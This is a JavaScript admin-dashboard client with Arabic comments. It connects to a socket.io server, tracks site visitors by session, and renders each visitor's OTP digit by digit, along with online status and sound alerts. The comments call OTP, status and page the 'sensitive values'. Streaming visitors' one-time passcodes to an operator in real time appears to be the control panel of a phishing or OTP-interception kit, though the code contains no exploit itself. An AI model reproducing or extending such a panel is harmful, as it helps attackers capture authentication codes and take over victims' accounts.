// --- CONFIG & STATE ---
const SERVER_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' 
  ? 'http://localhost:3000' : window.location.origin;

let socket = null;
let allAdminVisitors = []; // المصدر الوحيد للحقيقة
let isMuted = false;

// --- INITIALIZATION ---
function initAdminSocket(password) {
    if (socket) socket.disconnect();
    
    socket = io(SERVER_URL, {
        auth: { token: password },
        transports: ['websocket', 'polling']
    });

    setupSocketListeners();
}

// --- CORE SOCKET LISTENERS ---
function setupSocketListeners() {
    socket.on('admin:initData', (data) => {
        hideLoadingState();
        allAdminVisitors = data.visitors || [];
        renderAllVisitorsToGrid();
        if (data.stats) updateStatsDisplay(data.stats);
    });

    socket.on('visitor:updated', (data) => {
        handleVisitorUpdate(data);
    });

    socket.on('visitor:new', (data) => {
        handleVisitorUpdate(data); // معاملة الجديد والمُحدث بنفس المنطق لتجنب التكرار
    });
}

// --- SMART UPDATE ENGINE ---
function handleVisitorUpdate(data) {
    const sessionId = data.session_id || data.sessionId;
    const existingIndex = allAdminVisitors.findIndex(v => v.session_id === sessionId);

    if (existingIndex !== -1) {
        // تحديث البيانات في المصفوفة
        allAdminVisitors[existingIndex] = { ...allAdminVisitors[existingIndex], ...data };
        // تحديث البطاقة الموجودة فقط (DOM Patching)
        updateVisitorCardInGrid(sessionId, allAdminVisitors[existingIndex]);
    } else {
        // إضافة جديد
        allAdminVisitors.unshift(data);
        addVisitorCardToGrid(data, true);
    }
    updateOnlineCounts();
}

// --- DOM RENDERING (EFFICIENT) ---
function updateVisitorCardInGrid(sessionId, visitorData) {
    const card = document.querySelector(`[data-session="${sessionId}"]`);
    if (!card) return addVisitorCardToGrid(visitorData);

    // تحديث القيم الحساسة فقط (OTP, Status, Page)
    const otpContainer = card.querySelector('.otp-display');
    if (otpContainer && visitorData.otp) {
        otpContainer.innerHTML = visitorData.otp.split('').map(d => `<span class="otp-char">${d}</span>`).join('');
    }
    
    // تحديث الـ Status Dot
    const statusDot = card.querySelector('.status-dot');
    if (statusDot) statusDot.className = `status-dot ${visitorData.is_online ? 'online' : 'offline'}`;
}

function renderAllVisitorsToGrid() {
    const grid = document.getElementById('visitorsGrid');
    grid.innerHTML = '';
    const fragment = document.createDocumentFragment();
    
    allAdminVisitors.forEach(visitor => {
        const div = document.createElement('div');
        div.innerHTML = createVisitorCard(visitor);
        fragment.appendChild(div.firstElementChild);
    });
    grid.appendChild(fragment);
}

// --- UTILITIES ---
function updateOnlineCounts() {
    const onlineCount = allAdminVisitors.filter(v => v.is_online).length;
    document.getElementById('onlineCount').textContent = onlineCount;
    document.getElementById('totalCount').textContent = allAdminVisitors.length;
}

function showLoadingState() {
    const loadingEl = document.getElementById('visitorsLoading');
    if (loadingEl) loadingEl.style.display = 'flex';
}

function hideLoadingState() {
    const loadingEl = document.getElementById('visitorsLoading');
    if (loadingEl) loadingEl.style.display = 'none';
}

// --- SOUND SYSTEM ---
function playSmartBeep(frequencies) {
    if (isMuted) return;
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    frequencies.forEach((freq, i) => {
        if (freq === 0) return;
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.frequency.value = freq;
        osc.start(ctx.currentTime + (i * 0.2));
        osc.stop(ctx.currentTime + (i * 0.2) + 0.15);
    });
}
